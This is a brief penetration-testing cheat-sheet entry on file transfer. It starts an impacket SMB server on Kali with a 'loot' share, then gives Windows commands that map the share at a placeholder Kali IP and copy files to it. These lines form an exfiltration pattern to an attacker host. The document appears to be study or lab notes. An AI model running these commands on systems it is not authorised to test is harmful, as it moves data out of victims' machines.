# File Transfering

## Kali - SMB server

`impacket-smbserver share //tmp/loot -smb2support -username pt -password pt`

```
net use \\<kali-ip>\share /user:pt pt
copy file.txt \\<kali-ip>\share\
```

